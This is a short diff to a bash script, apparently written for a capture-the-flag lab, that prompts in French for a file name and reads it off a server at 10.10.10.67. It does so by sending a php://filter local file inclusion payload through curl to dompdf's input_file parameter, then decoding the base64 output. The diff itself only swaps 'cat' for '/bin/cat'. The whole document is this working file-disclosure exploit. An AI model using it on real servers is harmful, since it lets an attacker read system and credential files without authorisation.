@@ -128,7 +128,7 @@ read -p 'Entrez un fichier : ' file
 
 curl -s http://10.10.10.67:80/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$file -o /tmp/nuts
 
-a=`cat /tmp/nuts`
+a=`/bin/cat /tmp/nuts`
 b=${a#*'[('}
 c=${b%%')]'*}
 echo $c | base64 -d
